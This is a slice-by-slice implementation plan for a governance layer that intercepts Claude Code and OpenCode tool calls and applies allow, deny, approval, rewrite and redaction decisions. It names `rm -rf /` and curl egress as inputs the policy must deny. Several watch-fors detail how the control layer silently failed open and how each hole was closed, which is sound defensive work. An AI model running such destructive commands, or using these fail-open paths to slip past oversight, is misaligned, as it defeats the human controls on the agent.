---
shaping: true
---

# ACS Reference Implementation over AGT — Slices

Implementation plan for Shape C. Ground truth for slice definitions; the shaping doc (`acs-reference-impl-shaping.md`) remains ground truth for R, shapes, and the breadboard.

Every slice ends in something demo-able.

---

## Slice Summary

| # | Slice | Parts | Demo |
|---|-------|-------|------|
| V1 | One host, one hook, a real AGT decision | C1, C3, C4 | "Ask Claude Code for a destructive shell command. AGT's stock policy denies it, and the reason lands in the transcript." |
| V2 | Envelope Inspector | C4 | "Watch the ACS request and response JSON stream live while you work." |
| V3 | All five dispositions, and both failure postures | C3, C4 | "One bundle produces allow, deny, ask, a rewritten tool call, and a policy-fired allow that is AGT's `warn`. Kill the Guardian under `proceed` and the step proceeds with an audit event; under `deny` it blocks. Posture negotiated at handshake." |
| V4 | Output redaction on Claude Code | C3 | "AGT's own package documents that Claude Code cannot *reliably* redact tool output. Here it is, redacted, by AGT's stock `redact` policy — in the tool's own output shape, which is the condition that makes it reliable." |
| V5 | Second host, zero AGT changes | C3 | "Same Guardian, same bundle, same policy. OpenCode is now governed. `git diff` shows zero lines changed in the Guardian, the bridge, or AGT — the one deployment-side edit is a manifest `tools:` entry, because OpenCode names its shell tool `bash` where Claude Code names it `Bash`." ⚠️ *was "same manifest" — see §V5* |
| V6 | Session state and provenance carriage | C4 | "The SessionContext chain grows per step. AGT emits `result_labels` at one step and gets them back as `input.ifc.source_labels` at the next, carried in the `IfcLabels` field of the ACS provenance record." |
| V7 | Conformance matrix | C1, C2, C5 | "Eight intervention points by five AGT verdicts, every cell resolved — `expressed` where ACS v0.1.0 expresses AGT, `guardian_only` where only process-local Guardian knowledge can, `unexpressed` with a named reason where it cannot. Plus the Trace pillar, measured as an explicit non-claim." |
| V8 | Upstream contract watch | C6 | "Point the harness at AGT `main`. A changed enum value is reported as a `SurfaceDiff` naming the surface and the field that moved." |
| V9 | A second tool shape, and the egress gate | C7, C9 | "Ask for a web fetch of a host the allowlist does not cover. AGT's stock `egress` gate denies it — a fourth gate class live, from one `data.json` key and no code. Then ask for the same destination over `curl`, and it denies again, this time from a Guardian-extracted destination. Both verdicts come from the same unforked rule." |
| V10 | A hook AGT has no host for | C8 | "Load a skill whose bytes changed since it was approved. AGT's stock `content_hash` gate denies it, driven by `steps/skillLoad` — an ACS hook no AGT host package implements, deciding through AGT's own unforked bundle." |

**Order rationale.** V1–V4 establish credibility on the host AGT already supports best, so the second-host claim in V5 lands against a working baseline rather than a promise. V7 is the deliverable Microsoft reads, but its cells can only be *resolved* once V1–V6 exist to be measured — never "green", which is the success name §V7 retracted and which this line had gone on carrying. V8 is what keeps V7 true after upstream moves. **V9 and V10 come after V8 rather than beside V4**, though neither depends on the upstream watch: both change what the conformance matrix measures, and a matrix that moves while it is being published is worse than one published late. V9 precedes V10 because V10's snapshot needs V9's normalised policy target — a skill-load snapshot has no `command` argument either, and would hit the same `runtime_error:path_missing` wall.

---

## V1: One host, one hook, a real AGT decision

**Demo:** In Claude Code, ask for a destructive shell command. AGT's stock policy denies it; the deny reason appears in the transcript.

**⚠️ Framing correction (R4.4).** The stock bundle ships **no** shell or command patterns — `patterns.rego` carries generic PII regexes only. What is stock is the *deciding module* (`agt.patterns`) and the priority chain in `agt_default.rego`; the destructive-command regex list is ours, supplied as configuration. R2.1 still holds exactly — zero Rego authored, behaviour driven only through `data.agt.defaults.config` — but the demo must be narrated as "AGT's stock policy engine, configured", never as "Microsoft ships an `rm -rf` deny-list". Overclaiming here would breach R4.4.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U1 | P1 | claude-code | prompt input | type | → N1 | — |
| U2 | P1 | claude-code | tool permission outcome in transcript | render | — | — |
| N1 | P1 | acs-hook shim | generic hook entrypoint, reads hook JSON on stdin | call | → N2 | — |
| N2 | P1 | `@acs/host-adapter` | `buildEnvelope(event, payload, hookmap)` | call | → N4 | — |
| N3 | P1 | `@acs/host-adapter` | `renderDecision(decision, hookmap)` | call | → U2 | — |
| N4 | P1 | `@acs/host-adapter` | `createGuardianClient(url).requestDecision()` JSON-RPC over HTTP | call | → N20 | → N3 |
| N5 | P1 | `@acs/host-adapter` | `negotiateSessionConfig()` — negotiates `timeout_config`, `on_decision_failure`, profiles | call | → N28 | → S13 |
| N20 | P3 | guardian | `POST /acs` JSON-RPC 2.0 endpoint | call | → N21 | — |
| N28 | P3 | guardian | `buildServerHello()` — ServerHello | call | — | → N5 |
| S13 | P1 | store | `negotiated session config` | — | — | → N6 (V3) |
| N21 | P3 | guardian | `validateEnvelope()` against v0.1.0 schemas | call | → N23 | — |
| N23 | P3 | guardian | `assembleSnapshot()` — envelope → AGT snapshot | call | → N30 | — |
| N24 | P3 | guardian | `mapVerdict()` — AGT verdict → ACS decision | call | — | → N4 |
| N30 | P3.1 | agt-bridge | `evaluateInterventionPoint(point, snapshot)` | call | — | → N24 |
| N31 | P3.1 | agt-bridge | `AgentControl.fromPath(manifest.yaml)` at boot | call | — | → N30 |
| S1 | P1 | store | `claude-code.hookmap.yaml` | — | — | → N2, N3 |
| S7 | P3.1 | store | `manifest.yaml`, binding `rego` → `data.agt.defaults.verdict`; `policy_target` **must** resolve to a leaf string (`$.tool_call.args.command`) | — | — | → N31 |
| S8 | P3.1 | store | `data.agt.defaults.config`, shipped as `policy/lib/data.json` **inside** the bundle directory | — | — | → N31 |
| S9 | P3.1 | store | AGT stock bundle at pinned ref, every `.rego` byte-identical | — | — | → N31 |
| S10 | shared | store | `mapping.yaml` | — | — | → N23, N24 |
| S11 | shared | store | `agt.lock` | — | — | → N31 |

**Scope note.** Only `pre_tool_call` is wired. No session state, no envelope log, no second host. `N23` assembles the snapshot from the envelope alone; it starts reading S3/S4/S5 in V6.

**Names in the table above are V1's.** `assembleSnapshot()` is what N23's one function was called when this slice shipped; it now ships as `assemblePreToolCallSnapshot()`, beside the `assemblePostToolCallSnapshot()` V4 added (`packages/guardian/src/assemble-snapshot.ts`). The row is left as V1 wrote it, so this section keeps reading as the record of what V1 delivered; [Detail C](acs-reference-impl-shaping.md#detail-c-affordances) carries the current names.

**Setup cost this slice absorbs:** ⚠️ *amended* — the `opa` CLI is **no longer a setup cost*. The npm package pulls `agent-control-specification-opa-darwin-arm64`, which ships OPA 0.70.0, overridable via `ACS_OPA_PATH` / `ACS_OPA_NO_BUNDLE`. The stock bundle passes 105/105 under both it and system OPA 1.18.2. What remains: the pinned AGT checkout and the first cut of `mapping.yaml`. **This closes D7 as Rego** — Cedar's only advantage was removing an external binary, and there is no external binary.

**⚠️ Watch-for — `bundle:` resolves against the manifest's own directory.** Discovered during V1 execution, after the `./` landmine below: `bundle:` is relative to the directory holding `manifest.yaml`, not the process cwd. With the manifest at `policy/manifest.yaml`, `bundle: policy/lib` resolves to `policy/policy/lib` and every call hard-fails `runtime_error:policy_invocation_failed`. The correct value is `bundle: lib`. This failure is *loud* — unlike the `./` landmine, it denies rather than silently allowing — but the two are easily confused because both stem from how AGT joins this one field.

**⚠️ Watch-for — the `./` landmine.** `policies.<id>.bundle` must **not** begin with `./`. AGT joins the manifest directory to the literal value, yielding `<dir>/./policy/lib`; OPA's bundle loader mis-derives the data mount path from the `/./` segment and silently drops `data.json`. The policy then matches nothing and **every decision becomes `allow`** — a fail-open with no error, in a governance tool. Measured: `./policy/lib` loads, `/abs/policy/lib` loads, `/abs/./policy/lib` is UNDEFINED. `createBridge` throws on `/./`, and V1's deny test is the backstop.

**⚠️ Amendment — the config lives inside the bundle.** `data_paths` cannot deliver `data.agt.defaults.config` while `bundle:` is set: the stock bundle ships no `.manifest`, so its roots default to `""`, it owns the whole data tree, and the `--data` document is discarded. S8 therefore ships as `policy/lib/data.json`. Every stock `.rego` stays byte-identical; `data.json` is the only added file, so R2.1/R2.3 hold — we author a data document, not policy.

**⚠️ Amendment — the bridge embeds the Node SDK, not the Python SDK.** The PyO3 binding sets only `action_identity`; the Node binding sets `input_identity` and `enforced_identity` distinctly (`sdk/node/native/lib.rs:191-204`). On Python, R1.4 is unverifiable and V7's N43 is impossible. This also makes the whole repo one TypeScript toolchain. Amends shaping A4.

---

## V2: Envelope Inspector

**Demo:** Watch the ACS request and response JSON stream live while you work in Claude Code.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U20 | P4 | inspector | envelope stream, request/response JSON pairs | render | — | — |
| U21 | P4 | inspector | decision badge: decision + `policy_references` + `reason_codes` | render | — | — |
| N26 | P3 | guardian | `createEnvelopeLogSink()` → `sink.write()` — **total**: never throws, never alters a decision | call | → S6 | — |
| N50 | P4 | inspector | `tailEnvelopeLog()` | observe | → U20, → U21 | — |
| S6 | P3 | store | `envelope log`, JSONL at `.acs/envelopes.jsonl` (gitignored), one entry per direction | — | — | → N50 |

**Why this early.** R5.1 and R5.2 are must-haves, and an ACS-first reader needs to see envelopes before anything more elaborate is worth showing. U21 is also what makes an observe-only outcome legible rather than buried: ACS carries it as `allow` with a non-empty `policy_references` — a policy fired and the action still proceeded — and the badge is what keeps that from rendering identically to a clean allow. The upstream disposition that maps to it is deliberately not named here: ACS has no such decision, and R5.2 exists so this package carries no policy-runtime vocabulary at all — in prose as much as in identifiers, since a word in a doc teaches it as effectively as a symbol does.

**Decisions taken at planning.** §V2 left the Inspector's form open; these close it, and are recorded here rather than only in the plan.

| # | Decision | Rationale |
|---|---|---|
| P1 | The Inspector is a **terminal process** — `bun run inspector`, a third terminal beside `bun run guardian` and `claude`. | Zero new dependencies, works over SSH, matches the repo's one-process-per-command shape. R7.1/R7.2 ask for a laptop and no paid dependency; a browser UI would add a server, a bundler and an asset pipeline without proving anything further about the wire. A browser view later reads the same S6 file. |
| P2 | S6 is a **file** — `.acs/envelopes.jsonl`, overridable with `ACS_ENVELOPE_LOG`. | The file is the seam that lets the Inspector import nothing from the Guardian. `jq` works on it unchanged. An in-process bus or a socket would couple P4 to P3. |
| P3 | The sink is **opt-in at the library level, on by default in the CLI**: `startGuardian` records only when `envelopeLogPath` is passed; `packages/guardian/src/main.ts` passes it. | V1's tests construct Guardians constantly; a default-on sink would scatter files through the working tree. The demo path still gets the log with nobody opting in. |
| P4 | Request/response pairing is by **JSON-RPC `id`**, carried as `rpc_id` on every entry. | The only identifier present in both directions. `params.request_id` exists on requests only. Pairing by arrival order breaks the moment two hooks are in flight. |
| P5 | The request is recorded **before validation**. | An envelope that fails the schema is the most useful thing an ACS-first reader can see, and it is exactly what disappears if the sink sits behind the validator. R5.1 says *every* hook firing. |

**⚠️ Watch-for — the envelope log sink must be total.** `sink.write()` sits on the decision path. V1 shipped three separate fail-opens before they were caught (the `./` bundle landmine, `tool_unknown` failing closed, and an unhandled Guardian throw reaching the shim as an empty stdout); an observability feature that can turn a governed tool call into an ungoverned one would be the fourth. Every write is wrapped: a failure disables the sink for the process lifetime, reports once, and never propagates. V2 asserts this end to end — `rm -rf /` is still denied when every sink write fails.

**⚠️ Watch-for — S6 records the parsed envelope, unmodified.** No field stripping, no redaction, no reordering of anything we control; pretty-printing happens at render time only. An inspector that shows something other than what was sent is worse than none. The consequence is that S6 carries raw tool arguments, which is why `.acs/` is gitignored and why the runbook says so out loud. **Corrected by V2's whole-branch review:** this watch-for originally said "records the wire verbatim", and so did the plan's global constraint 11, the slice README, the runbook, and the Inspector's own renderer comment. The sink is handed `await req.json()`, so it stores a JSON *value*, not bytes — the parse collapses duplicate keys, canonicalises number literals, and hoists integer-like object keys, and `arguments` keys are host-controlled. Storing bytes instead would make `envelope` a string rather than JSON, costing the Inspector its pretty-printing and the round-trip contract test its subject. The wording was corrected everywhere rather than the code.

**⚠️ Watch-for — a schema failure appears as an error, not a decision.** In V2 an invalid envelope is recorded (P5) and then answered with a JSON-RPC error, so the Inspector renders `✖ ERROR -32010`, not a badge. `N27 denyOnInvalidEnvelope()` — the affordance that turns Guardian-side failures into honoured ACS `deny` **decisions** — is V3. The Inspector is where that change will become visible.

**Unpaired responses are real.** A body that will not parse as JSON produces a response with no preceding request and `rpc_id: null`. The Inspector renders it as `(no method) (unpaired)` rather than hiding it.

**Scope added at planning** (both amend this slice, both land in V2's PR):
- An **invariant gate** on `packages/inspector/src`: zero AGT vocabulary, zero host vocabulary, and no import of `guardian` or `agt-bridge`. R5.2 is why this slice is early, and V1 established that this project turns architectural claims into grep gates rather than prose. Joins the R3.2/R3.3 gates in `test/invariants.test.ts`.
- A **write↔tail contract test** (`test/envelope-log-sink-roundtrip.test.ts`). The Inspector declares its own `EnvelopeLogEntry` instead of importing the Guardian's — that is what makes the gate above meaningful — and the duplication is only safe while something fails when the two drift.

**⚠️ Amended by V3.** The import gate above widens to forbid `host-adapter` as well. V3's N51 has the Inspector read S14, a **host-side** artifact, so a two-name gate would have quietly stopped covering R5.2 the moment N51 landed. The same pairing applies: the Inspector declares its own `AuditEntry`, and `test/audit-sink-roundtrip.test.ts` keeps the two declarations from drifting.

---

## V3: All five dispositions, and both failure postures

**Demo:** One bundle produces allow, deny, ask, and a rewritten tool call, plus a policy-fired allow that is AGT's `warn`. Then kill the Guardian mid-flight twice — once under `on_decision_failure: proceed`, where the step proceeds and an audit event appears; once under `deny`, where it blocks. Same adapter, same policy, posture negotiated at handshake.

**⚠️ Demo corrected — `defer` is not producible from AGT, and that is ACS headroom rather than a gap.** The original sentence promised five ACS dispositions from one bundle. AGT's verdict vocabulary is exactly five — `allow`, `warn`, `deny`, `escalate`, `transform` — and **none maps to ACS `defer`**; `mapping.yaml` correctly declares no rule producing one. The only conformant route to a `defer` is ACS §9.2's approver-incapable substitution, which the spec deliberately keeps **off the wire** in v0.1 ("ACS does not put this declaration on the wire in v0.1; it is part of the Guardian's policy bundle"), so it is driven by no AGT verdict at all. Manufacturing one would invert R1: the claim is *"AGT is completely expressible in ACS"*, one direction. ACS carrying a disposition AGT has no need for is headroom in the wider contract, and this slice says so instead of filling it. What V3 demonstrates is AGT's five verdicts arriving losslessly — which is R1.2 moving from unit-tested to live, including `warn` as `allow` with non-empty `policy_references`. The slice keeps its name: the **five** are AGT's five verdicts as delivered over the wire, not five ACS dispositions.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U23 | P4 | inspector | posture badge: negotiated `on_decision_failure` + count of audited fail-open proceeds | render | — | — |
| N6 | P1 | `@acs/host-adapter` | `applyFailurePosture()` — no decision within timeout → negotiated posture (default `proceed`); audits every fail-open proceed | call | → S14, → N3 | — |
| N7 | P1 | `@acs/host-adapter` | `validateDecision()` — malformed `modifications` → `DENY`; `ASK`/`DEFER` expiry → their `timeout_*` defaults; **applies** §6.3's modifications to produce the host's rewritten input | call | → N3, → N6 | — |
| N27 | P3 | guardian | `denyOnInvalidEnvelope()` — schema or bridge failure returns an explicit ACS `deny` **decision**, not a bare error | call | → N26 | → N4 |
| N51 | P4 | inspector | `tailAuditLog()` | observe | → U23 | — |
| S13 | P1 | store | `negotiated session config` — **file-backed per session** (see the resolved blocker below); V1 built the in-memory half | — | — | → N6 |
| S14 | P1 | store | `audit sink` — every fail-open proceed, per §6.4's MUST | — | — | → N51 |

**Two failure domains, kept separate.** AGT fails closed on *evaluation* — bad policy output, invalid transform, missing paths — and that produces a `deny` **verdict**, which §6.4 says the host MUST honor regardless of posture. N27 exists so Guardian-side failures also arrive as decisions rather than bare errors, keeping them in that honored path. `on_decision_failure` only governs *delivery*: the Guardian stayed silent, the transport died, or an error arrived whose code carries no verdict and does not say the Guardian refused. Conflating the two would either break AGT's invariant or halt production on a network blip.

**⚠️ Correction — a third domain, discovered by review after V3 shipped: a refusal is neither.** "Error with no decision" was filed under *delivery* without qualification, so a JSON-RPC error whose code means **the Guardian was alive and refused this envelope** resolved by the negotiated posture — and under the shipped default (`proceed`) became `allow`. A governance tool must not proceed because the thing governing it said no in a shape the host was not reading. Four codes reach the host that way, and the host now denies on all four regardless of posture, still audited: `-32700` (nothing parseable arrived), `-32010` (envelope invalid and unaddressable, or over the request cap), `-32011` (method not dispatched), `-32020` (evaluation failed). `-32011` is the arguable one: a host only ever sends methods its own hookmap maps, so a Guardian refusing to dispatch one is a misconfiguration of *this deployment* rather than a permission — the alternative reading, that `handshake.json`'s `methods_evaluated` makes an unlisted method ALLOW-by-default, is about coverage the ServerHello **declared** in advance, not about a method accepted at handshake and then refused at dispatch. An error code the host does not recognise stays a delivery failure and keeps the posture, deliberately: widening this to every error object would fail closed on an error the Guardian never sent. `packages/host-adapter/src/failure-kinds.ts` (`RefusalFailureKind`) and `failure-posture.ts` (`REFUSAL_RPC_CODES`) carry the same reasoning at the code site.

**⚠️ Blocker discovered in V1 — S13 has no home across processes. ✅ Resolved: a session-keyed file (P1).** V1 built `S13` as an in-process store, but the Claude Code shim is a **fresh subprocess per hook invocation**, so an in-memory negotiated session config can never survive to the next hook. `negotiateSessionConfig()` is also not called on the real path in V1 at all. `N6 applyFailurePosture()` reads S13, so V3 could not work until this was resolved.

The first hook of a session handshakes and writes the ServerHello to `.acs/sessions/<session_id>.json`; later hooks read it and skip the round trip. Claude Code puts `session_id` in every hook payload, so the key costs nothing. What disqualifies the alternatives is *when* the value is needed: the posture exists for the case where the Guardian gives no usable decision, so it cannot be fetched from the Guardian at the moment of use — which rules out re-handshaking per hook. A session-scoped daemon would work, but costs a third process to start, supervise and discover, breaks R7.1's "one command on a laptop", and V5's in-process host would share none of it.

The resulting shape is better than a workaround: **S13 becomes one interface with two implementations** — file-backed for subprocess hosts, in-memory for V5's in-process plugin — so the adapter stops caring how the host runs. That strengthens R3.4 rather than weakening it, and it is the seam V6's session chain will sit on. `session_id` reaches a filesystem path from a host payload, so it is validated as untrusted input: one path segment of `[A-Za-z0-9._-]{1,128}`, with `.` and `..` rejected.

**⚠️ "Rest of the slice is data, not structure" is partly wrong.** Disposition *coverage* is indeed configuration — S1 and S8, exactly as written. The `modify` **path** is not, and two structural pieces are load-bearing:

- `mapVerdict` synthesizes ACS `modifications` from an AGT `transform` verdict. V1 mapped `transform → modify` while emitting **no** `modifications`, which §6 makes invalid (MODIFY requires it). Declared in `mapping.yaml` so V7's harness publishes the same table the runtime uses.
- The adapter **applies** those modifications to produce the host's rewritten input. V1's hookmap copied the raw ACS `modifications` object into Claude Code's `updatedInput`, a shape it does not accept — so the rewrite would have been reported and never taken effect. R1.6 is satisfied by the rewrite landing, not by carrying the object.

Without both, `modify` is a decision nothing acts on.

**⚠️ AGT's stock approval gate is a single global switch — a mechanic of the demo, not a shortcoming (R4.3).** Verified by running it: the stock chain's priority is `deny > escalate > transform > warn > allow`, and the escalate gate is `cfg.approval.required`, a global boolean. The manifest's own `approval:` section configures `default_resolver`, `timeout_seconds`, `on_timeout`, `fatigue_threshold`, `fatigue_window_seconds`, `resolvers` — resolution, not scope. So with approval on, every step that is not denied escalates, and `allow`/`transform`/`warn` are unreachable in that same config. Consequence: showing several verdict classes means several **config documents** over the same pinned bundle. Zero Rego is authored either way, so R2.1 and R2.4 are untouched. AGT's stock library is a starting default for hosts that author no Rego; a host wanting one deployment to both auto-allow and require approval writes a rule, which is what the Rego surface is for.

**⚠️ AGT's `annotations` policy-input member does not come from the snapshot.** Verified: annotations placed at the snapshot's top level, under `envelope`, under `tool_call`, under `context`, or under two snake_case aliases are **all dropped** — a `confidence.min_score` gate that should have denied returned `allow` in every placement. They come from a manifest-declared annotator dispatched through the SDK's `annotatorDispatcher`, a surface published in `AgentControl.fromPath`'s own type signature (so R2.4 holds). Observed directly from a dispatcher's `preliminaryPolicyInput`, R1.3's five members are `intervention_point`, `policy_target`, `snapshot`, `annotations`, `tool`.

Two consequences. First, `warn` is reachable and V3 makes it live, closing the gap V2 left open where U21's `◐ ALLOW (policy fired — ACS "warn")` badge state was unit-tested but never seen. Second — **for V7** — the score has no source on the ACS v0.1.0 wire: `hooks/tool-call-request.json` carries `tool`, `operation`, `capability`, `arguments`, `raw_command`, `intent`, and nothing a drift or confidence score could honestly be derived from. So a wire consumer cannot drive AGT's `warn` gate; the Guardian must originate the score. AGT's own design says as much ("Hosts run a behaviour-drift detector **outside the policy engine**") and the Guardian is the host here, so this is AGT working as intended and a note about ACS v0.1.0's coverage — the same shape as D10's Trace attributes.

**Scope added at planning** (all amend this slice, all land in V3's PR):
- **A timeout on `guardianClient.post`.** §6.4 defines a decision failure as "no usable decision **within the negotiated timeout**", and V1's client has none — a silent Guardian hangs the hook forever and N6 can never fire.
- **`mapping.yaml` gains a `modifications` synthesis** (R1.6, Guardian side) and **the adapter gains `applyModifications`** (R1.6, host side). See the structure correction above.
- **A test-only per-config bundle helper.** Config lives in the bundle directory and the shipped SDK exposes no data-push API, so covering five verdict classes means five config documents. The helper asserts each copied `.rego` is byte-identical to `policy/lib`'s, so a fixture can never silently fork the pinned bundle.
- **`policy/manifest.drift.yaml`** — a second manifest over the same `bundle: lib`, declaring the annotator that makes `warn` reachable. The main manifest is untouched, so no existing behaviour changes and a deployment wanting no annotator has none.
- **The R5.2 invariant gate widens to forbid importing `host-adapter`** in `packages/inspector/src`. S14 is a host-side artifact the Inspector now reads, and without the third entry R5.2 would quietly weaken the moment N51 landed. Joins the gates in `test/invariants.test.ts`.
- **The shim's V1 placeholder goes.** V1 exited 1 with empty stdout when anything threw, which Claude Code reads as a non-blocking error and proceeds — an unaudited, undeclared fail-open of exactly the shape this project keeps finding. **The shim now has two exit codes and no exit-1 tier at all:** 0 with a decision on stdout, or 2 (a blocking error, which Claude Code surfaces) when the deployment's own configuration makes a decision impossible — unparseable stdin, a missing or unsafe `session_id`, an unloadable or malformed hookmap. An earlier draft of this row said "once a hook payload parses, the shim always exits 0", which was never true and is corrected here: the whole-branch review found that a payload which parsed but carried no `session_id` still exited 1, while a `session_id` that was present but unsafe exited 2 — two members of one class failing in opposite directions. A governance hook that cannot read its own input has no honest reason to prefer proceeding to blocking.

Wire N21's error branch to N27, and N4's return through N7 here.

Plan: `docs/superpowers/plans/2026-08-10-v3-dispositions-and-postures.md`.

---

## V4: Output redaction on Claude Code

**Demo:** AGT's own Claude Code package documents that it cannot ***reliably*** redact tool output, and does not *claim* parity. Here is a tool result redacted by AGT's stock `redact` policy, delivered through `updatedToolOutput` **in the tool's own output shape** — which is the condition that makes it reliable, and therefore the condition AGT's wording was scoping around.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U3 | P1 | claude-code | rewritten tool output in transcript | render | — | — |

New entries in S1 for `PostToolUse` → `steps/toolCallResult`, and in S8 for the `redact` rules. Beyond those, the slice extends six existing affordances to a **second ACS method** rather than adding new ones: `N2 buildEnvelope` (result payload), `N3 renderDecision` (see the correction below), `N7 validateDecision` (array-index descent), `N21 validateEnvelope`, `N23 assemblePreToolCallSnapshot` (**a sibling `assemblePostToolCallSnapshot`, not a branch** — see the correction below), `N24 mapVerdict` (a result-side `modifications` synthesis).

**⚠️ F1 resolved during V4 planning — the slice proceeds, with two conditions attached.** Confirmed by hand against Claude Code **2.1.227**: `PostToolUse.hookSpecificOutput.updatedToolOutput` exists ("Replaces the tool output before it is sent to the model") and does rewrite tool results. Risk row 1 retires. But two things the original row did not anticipate govern the whole slice, and both were found by running it:

**⚠️ Watch-for — a replacement that does not match the tool's own output schema is silently discarded, and the ORIGINAL output is delivered.** This is the slice's central hazard and it is a fail-open. A hook returning `updatedToolOutput: "[REDACTED]"` — a plain string, the natural reading of "redact the output", and exactly the shape §6.3's `modified_content` provides — produced this, while the model received the real secret:

> `PostToolUse hook returned updatedToolOutput that does not match Bash's output shape; using original output. [{"expected":"object","code":"invalid_type","path":[],"message":"Invalid input: expected object, received string"}]`

`Bash`'s shape is `{stdout, stderr, interrupted, isImage, noOutputExpected}`. So a redaction is only a redaction if it preserves every sibling field, and the adapter gets there by patching a **clone of the object the host handed it** at a hookmap-named path — never by constructing a new one. Where it cannot, it fails closed. This is why AGT's README says "cannot **reliably** redact": the wording is exact, and this watch-for is the evidence for it rather than a correction of it.

**⚠️ Watch-for — a `deny` at the result gate does not suppress anything.** Rendering deny as Claude Code's documented `{"decision":"block","reason":…}` was tested directly: the model received the real stdout **and** the block reason. The tool has already run and its result has already been formed. So `block` alone would *report* a suppression that did not happen — the same "reported but never took effect" shape §V3 found when V1 copied a raw `modifications` object into `updatedInput`. Deny renders as `block` **and** a replacing `updatedToolOutput`; only the latter withholds.

**⚠️ Correction — "new entries in S1" understates it; `decisions` is one block shared by every hook.** ~~N3 requires a `permissionDecision` and hardcodes three Claude Code field names (`permissionDecision`, `permissionDecisionReason`, `updatedInput`) … declares host output field names as data (`set` / `from` / `top_level`).~~ **Superseded before V4 began.** PR #10's review landed the field-name half on `slice/v1`, on this same reasoning: `renderDecision` now reads an `output:` map of **dotted host paths** to `{value}` or `{from, type}`, names no host field, and `test/invariants.test.ts` gates that. A path with **no dot** already renders top-level, which is how `PostToolUse` gets its `decision`/`reason` beside `hookSpecificOutput.updatedToolOutput` — so `set` / `from` / `top_level` **never shipped and is not built**. Struck through rather than deleted because a row naming a shape that never existed is the ghost-name defect PR #11 filed against `N26`, and V5 would have inherited it.

What is still V4's: `decisions` is a **single top-level block** for all hooks, `renderDecision` takes no hook name, and three gates require every decision to declare a `permissionDecision` — `assertRenderableDecisions` at hookmap load, `assertHostAcceptsEveryDecision` in the shim, and the shim's missing-wrapper refusal. `PostToolUse` has no such field, so the block moves **under each hook** and all three gates learn the hook. That is what makes **V5's `N12` — "`renderDecision()` — same module as `N3`" — literally true**: V4 is where a second *hook* forces the split a second *host* would have forced anyway.

**⚠️ Watch-for — a clean `PostToolUse` allow renders *nothing*, and two fail-open guards are gate-specific because of it.** At `PreToolUse`, an output with no decision in it means the tool call proceeds ungoverned, so `renderDecision` refuses an empty rule and the shim refuses an output with no `hookSpecificOutput` wrapper. Both refusals are correct there and **wrong** at a gate where the tool has already run: "nothing to change, deliver it unchanged" is the honest answer for a clean result, and refusing it would exit 2 on every clean tool call. Neither guard is relaxed — each learns the hook. The `allow` entry declares one **conditional** field, `hookSpecificOutput.additionalContext` from `reasoning` (present in 2.1.227's `PostToolUse` schema), so the rule is non-empty while the rendered output is: a plain allow renders `{}`, and an observe-only allow (AGT `warn` → ACS allow, R1.2) reaches the transcript — the same gap §V3 closed for `PreToolUse`'s `allow`, closed the same way at the second gate.

**⚠️ Correction — the result gate is a *sibling* of the request gate at every layer, not a branch inside it.** *(Names, before you read any: unquoted prose in this paragraph uses the shipped `assemblePreToolCallSnapshot` and `assemblePostToolCallSnapshot`. The one quotation below keeps `assembleSnapshot`, which was the request-gate assembler's real name until `ed274c7` renamed it. `assembleResultSnapshot`, which this paragraph used to call the result-gate sibling, was never a function at all — V4 shipped that sibling as `assemblePostToolCallSnapshot` in `32dec42`, so there is no code history for the old name to be a record of.)* This slice's own sentence above said "`N23 assembleSnapshot` (a `post_tool_call` branch)", and PR #10's review had already ruled otherwise on `slice/v1`: `assemblePreToolCallSnapshot` takes the **narrow** `ToolCallRequestEnvelope`, reachable only through `isToolCallRequest`, and its doc comment says *"A later slice's `post_tool_call` snapshot is a sibling type beside this one, not a widening of it."* So V4 adds `ToolCallResultEnvelope`, `isToolCallResult`, `AgtPostToolCallSnapshot` and `assemblePostToolCallSnapshot`, each beside its twin, and the Guardian dispatches on **the predicate that narrowed the envelope** — never on the method string and never on the resolved intervention point. The two snapshots share no member but `envelope.budgets`, which is why a union type is the wrong answer. `mapping.yaml` declares six methods with points and this Guardian assembles two, so a point-driven dispatch would hand a `steps/sessionStart` envelope to whichever assembler came first and return a verdict that looks perfectly well-formed while having evaluated the wrong policy against the wrong shape. `N23`'s affordance row now names both functions.

**⚠️ Watch-for — `validateEnvelope` gained a payload schema for the result method, which moves a boundary.** Before V4, `validateEnvelope` payload-checked only `steps/toolCallRequest` and a `steps/toolCallResult` envelope fell through to a bare `method_not_dispatched` JSON-RPC error — which the host adapter reads as *no decision arrived*, and answers with the negotiated posture. Now a malformed result envelope gets N27's honoured `envelope_invalid` **deny** instead. Intended and fail-closed, and worth stating because it is the one place this slice changed what an existing method-shaped failure does. Note also that `outputs: []` is schema-valid (`hooks/tool-call-result.json` sets no `minItems`), reaches the assembler, and AGT answers `deny` / `runtime_error:path_missing` — pinned, because "empty output" is the shape most likely to be answered with an allow by a later change.

**⚠️ Watch-for, found by V4 and NOT V4's to repair — an audit entry can outlive the decision it claims.** The shim's own wrapper checks (`asClaudeCodeOutput`) exit 2 and block, but the failure posture has **already written an audit line reading `outcome: "proceeded"`** by the time they fire. So the durable record says a step was proceeded while the process blocked it. Measured, twice, independently. It is the same durable-false-record shape `governStep`'s guard exists to prevent, reached one seam later — and it also falsified a claim V4 wrote in the shim's exit-code list, which is now retracted there.

**The repair is deliberately not in V4.** The write happens inside the posture, and *what an audit entry should say when the decision it records could not be delivered* is a question about the **audit sink's contract** (V2's rail, V3's posture) — answering it inside a result-gate fix round would settle a cross-cutting contract from the wrong end. No test was added either, because a test there would pin the false line as expected. Recorded here rather than only in a gitignored report, because this is the kind of finding that otherwise reaches nobody. It belongs on the next whole-branch review's list first.

**⚠️ Correction — ACS's result payload carries no tool arguments.** `hooks/tool-call-result.json` requires `tool`, `exit_status`, `outputs` and nothing else. So at this gate the wire cannot supply `tool_call.args`, and the Guardian synthesizes `tool_call: { name }` from `payload.tool.name` — load-bearing, because AGT resolves `tool_name_from` before policy runs and fails **closed** (`runtime_error:path_missing`) without it. A policy wanting both the call and its result must correlate through `request_id_ref`, which is **V6's** session chain. V7 records the cell.

